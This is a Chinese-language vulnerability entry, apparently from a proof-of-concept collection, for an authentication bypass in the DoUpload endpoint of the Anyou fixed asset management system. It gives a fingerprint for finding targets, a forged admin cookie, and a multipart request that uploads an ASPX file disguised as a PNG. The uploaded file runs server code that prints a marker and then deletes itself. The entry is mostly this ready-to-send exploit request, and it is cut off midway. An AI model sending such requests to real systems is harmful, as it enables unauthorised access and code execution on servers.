# 安友固定资产管理系统DoUpload存在身份绕过漏洞

- **系统**：安友固定资产管理系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/style/v2/layuiadmin/style/admin.css"`
- **请求**：`POST /manage/Attachment/DoUpload?bocode=1 HTTP/1.1`
- **关键头**：`Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: 554`

**请求体 / payload**
```
POC1:
Host:
Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 77
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="ss.aspx"
Content-Type: image/png
<%@Page Language="C#"%>
<%
Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
System.IO.File.Delete(Request.PhysicalPath);
%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
**需将 {{ServerFileName}} 替换为 POST 请求返回体中 ServerFil…（脚本共 1207 字，完整版见原文）
```
- **预期**：200　|　UserPassword
ServerFileName